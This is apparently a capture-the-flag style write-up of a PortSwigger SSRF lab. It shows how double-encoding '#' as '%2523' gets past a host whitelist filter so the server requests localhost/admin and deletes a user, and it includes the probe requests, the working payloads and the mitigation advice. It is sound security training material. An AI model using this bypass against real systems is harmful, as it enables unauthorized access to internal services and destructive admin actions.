# SSRF with whitelist-based input filter

**Source:** [PortSwigger](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)  
**Category:** SSRF  
**Difficulty:** Expert

## Objective
To solve the lab, change the stock check URL to access the admin interface at `http://localhost/admin` and delete the user carlos.

## Vulnerability
This lab has a stock check feature which fetches data from an internal system.

The developer has deployed an anti-SSRF defense you will need to bypass.

## Exploitation

### Steps

1. Access the lab, intercept the stock check request. The request contains:
    ```text
    stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
    ```

2. Send the request to Repeater and try substituting simple values in the `stockApi` parameter to determine how the filter works:
    - `http://localhost/admin` -> `400 Bad Request`
    - `http://stock.weliketoshop.net/admin` -> `500`
    - `http://stock.weliketoshop.net@localhost/admin` -> `400`
    - `http://localhost#@stock.weliketoshop.net/admin` -> `400`

    Conclusion: the filter parses the URL and requires the **host** to be exactly `stock.weliketoshop.net`. The 400 error message is:
    ```text
    "External stock check host must be stock.weliketoshop.net"
    ```

3. Test `stockApi=http://stock.weliketoshop.net%23@127.1/admin` returns:
    ```text
    "Invalid external stock check url 'Illegal character in scheme name at index 8: stockApi=http://stock.weliketoshop.net#@127.1/admin'"
    ```
    The message shows the **decoded** URL (`%23` -> `#`) - meaning the filter **decodes the value once** before parsing.

4. Test `stockApi=http://stock.weliketoshop.net%23@localhost/admin` returns `500` - the filter **lets it through**, but the request goes to `stock.weliketoshop.net`, not to `localhost`, because the backend treats `#` as the start of a fragment and cuts off `@localhost/admin`.

5. Key conclusion: the filter decodes **once**, and the HTTP library performing the request decodes **one additional time**. This allows building a **parser differential** - the same string is interpreted differently by the filter and by the backend.

6. Build a payload using double-encoded `#` (`%2523`):
    ```text
    stockApi=http://localhost%2523@stock.weliketoshop.net/admin
    ```
    - **Filter (1st decoding):** `http://localhost%23@stock.weliketoshop.net/admin` -> sees `%23` (not `#`) -> parses host as `stock.weliketoshop.net`
    - **Backend (2nd decoding):** `http://localhost#@stock.weliketoshop.net/admin` -> sees `#` -> host = `localhost`, fragment = `@stock...`

    The response returns a list of users, the bypass works.

7. From the account list, read the user deletion endpoint:
    ```text
    /admin/delete?username=carlos
    ```

8. Send the final payload, building the URL the same way as in step 6 - with `localhost`, double-encoded `#` (`%2523`), and the host `stock.weliketoshop.net` after `@`:

    ```text
    stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
    ```

    After passing through the filter and double decoding, the backend performs the request:

    ```text
    http://localhost/admin/delete?username=carlos
    ```
    The response is `302 Found`, lab solved.

### Payload
```text
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

### Shortcut
1. Intercept the stock check request and send `stockApi` to Repeater.
2. Use double-encoded `#` (`%2523`) so the filter sees `%23` but the backend decodes it to `#`.
3. Payload: `http://localhost%2523@stock.weliketoshop.net/admin`.
4. Confirm admin panel access via the user list.
5. Request `http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos` to delete Carlos.

## Impact
An attacker can exploit a parser differential between the filter and the backend to bypass SSRF protections. This allows access to internal-only services such as the admin panel and execution of privileged actions like deleting users.

## Mitigation
Decode input exactly once and validate the final parsed host after decoding. Do not rely on a single filter layer; ensure the same URL parser is used for validation and for the actual request. Use an allowlist of permitted hosts and paths. Block internal addresses and non-standard URL forms.

## Tools
- Burp Suite
- Repeater

## Notes
- The filter requires the host to be exactly `stock.weliketoshop.net`.
- The filter decodes the value once before parsing.
- The backend HTTP library decodes it a second time.
- `%2523` decodes to `%23` in the filter and to `#` in the backend.
- `#` makes the backend treat the preceding part as the host and the rest as a fragment.
- Final payload deletes `carlos` and returns `302 Found`.